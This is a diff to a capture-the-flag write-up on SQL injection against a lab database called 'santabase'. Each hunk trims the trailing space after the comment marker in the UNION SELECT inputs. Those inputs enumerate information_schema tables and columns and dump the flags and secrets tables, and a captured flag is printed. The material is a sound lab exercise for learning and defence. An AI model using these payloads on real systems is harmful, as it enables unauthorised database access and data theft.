@@ -62,7 +62,7 @@ If this were the query, we could use a `UNION SELECT` to add our own query. Let'
 UNION SELECT table_name, 2, 3 FROM information_schema.tables
 ```
 
-The `2` and `3` in the `SELECT` are a filler because our guessed query has three columns. The use this query we have to escape the string in the query first. To do this, I added a `'` before our query and appended the symbols for a comment (`--`) at the end. This results in the following input: `' UNION SELECT table_name, 2, 3 FROM information_schema.tables -- `. This way the query that will be executed becomes this:
+The `2` and `3` in the `SELECT` are a filler because our guessed query has three columns. The use this query we have to escape the string in the query first. To do this, I added a `'` before our query and appended the symbols for a comment (`--`) at the end. This results in the following input: `' UNION SELECT table_name, 2, 3 FROM information_schema.tables --`. This way the query that will be executed becomes this:
 
 ```sql
 SELECT id, descr, proof FROM santabase WHERE descr LIKE '%' UNION SELECT table_name, 2, 3 FROM information_schema.tables -- %' OR proof LIKE '%' UNION SELECT table_name, 2, 3 FROM information_schema.tables -- %'
@@ -254,7 +254,7 @@ The flags table at the bottom looks interesting. Let's grab it's contents. To ge
 UNION SELECT (SELECT * FROM flags), 2, 3
 ```
 
-This query also has to be converted to an input first. This will become `' UNION SELECT (SELECT * FROM flags), 2, 3 -- `.
+This query also has to be converted to an input first. This will become `' UNION SELECT (SELECT * FROM flags), 2, 3 --`.
 
 After submitting this input, I got the flag: `NOVI{7h1s_flag_w@s_chuncky_right}`.
 
@@ -272,7 +272,7 @@ Because the `secrets` table a more than one column, we need to know the column n
 UNION SELECT column_name, 2, 3 FROM information_schema.columns WHERE table_name = "secrets"
 ```
 
-Converted to an input: `' UNION SELECT column_name, 2, 3 FROM information_schema.columns WHERE table_name = "secrets" -- `.
+Converted to an input: `' UNION SELECT column_name, 2, 3 FROM information_schema.columns WHERE table_name = "secrets" --`.
 
 After remove the results from the original query, we get the following:
 
@@ -290,7 +290,7 @@ UNION SELECT CONCAT(id, ":", description, ":", proof), 2, 3 FROM secrets
 
 The `CONCAT()` here is to put our results into the first column as the other two column are hidden after the first five characters.
 
-This query converts to `' UNION SELECT CONCAT(id, ":", description, ":", proof), 2, 3 FROM secrets -- ` as the input.
+This query converts to `' UNION SELECT CONCAT(id, ":", description, ":", proof), 2, 3 FROM secrets --` as the input.
 
 After parsing the output we get:
 
